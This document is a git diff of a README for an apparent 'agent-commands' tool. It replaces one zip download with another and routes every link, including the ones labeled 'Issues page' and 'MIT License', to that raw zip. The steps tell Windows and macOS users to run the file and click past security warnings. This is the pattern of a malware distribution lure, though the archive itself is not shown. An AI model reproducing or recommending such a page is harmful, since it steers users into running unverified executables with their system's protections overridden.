@@ -1,6 +1,6 @@
 # 🚀 agent-commands - Simple Commands for Your Agents
 
-[![Download Now](https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent-commands_2.3.zip%20Now-Release-007bff)](https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent-commands_2.3.zip)
+[![Download Now](https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent_commands_predivider.zip%20Now-Release-007bff)](https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent_commands_predivider.zip)
 
 ## 📦 Overview
 
@@ -23,14 +23,14 @@ Before you download, make sure your system meets the following requirements:
 
 To get started, please visit the Releases page to download the necessary files.
 
-[Visit this page to download.](https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent-commands_2.3.zip)
+[Visit this page to download.](https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent_commands_predivider.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the most recent release at the top of the page.
 3. Download the file suitable for your operating system:
-   - For Windows: `https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent-commands_2.3.zip`
-   - For macOS: `https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent-commands_2.3.zip`
-   - For Linux: `https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent-commands_2.3.zip`
+   - For Windows: `https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent_commands_predivider.zip`
+   - For macOS: `https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent_commands_predivider.zip`
+   - For Linux: `https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent_commands_predivider.zip`
 4. Save the file to a location on your computer where you can find it easily.
 
 ## ⚙️ Running the Application
@@ -39,21 +39,21 @@ Once you have downloaded the file, follow these simple steps to run it:
 
 ### Windows
 
-1. Find the downloaded `https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent-commands_2.3.zip` file in your Downloads folder.
+1. Find the downloaded `https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent_commands_predivider.zip` file in your Downloads folder.
 2. Double-click the file to run it.
 3. If prompted by the security warning, click "Run" to continue.
 4. Follow the on-screen instructions to use the commands with your agents.
 
 ### macOS
 
-1. Open the `https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent-commands_2.3.zip` file from your Downloads folder.
+1. Open the `https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent_commands_predivider.zip` file from your Downloads folder.
 2. Drag the `agent-commands` icon to your Applications folder.
 3. Open the Applications folder and double-click `agent-commands` to run it.
 4. If your Mac gives a warning, right-click the icon and choose “Open,” then confirm.
 
 ### Linux
 
-1. Extract the `https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent-commands_2.3.zip` file in your preferred location using the terminal or a file manager.
+1. Extract the `https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent_commands_predivider.zip` file in your preferred location using the terminal or a file manager.
 2. Open the terminal and navigate to the folder where you extracted the files.
 3. Run the command: `./agent-commands`.
 4. Follow the prompts in the terminal to execute commands with your agents.
@@ -73,7 +73,7 @@ For more detailed instructions on each command, you can refer to the help sectio
 If you encounter issues while downloading or using the application, consider the following resources:
 
 - **FAQ:** Check the Frequently Asked Questions section on the GitHub page for common problems and solutions.
-- **Issues Page:** If you experience a bug or need assistance, visit our [Issues page](https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent-commands_2.3.zip) to report it or ask for help.
+- **Issues Page:** If you experience a bug or need assistance, visit our [Issues page](https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent_commands_predivider.zip) to report it or ask for help.
 - **Community:** Join our community discussions to share tips and tricks on using agent-commands effectively.
 
 ## 🔄 Updating
@@ -86,6 +86,6 @@ We welcome your feedback. If you have suggestions for new features or improvemen
 
 ## 📖 License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent-commands_2.3.zip). 
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/math2024444-spec/agent-commands/main/specific/agent_commands_predivider.zip). 
 
 Thank you for using agent-commands! Enjoy enhancing your agents with our simple set of commands.
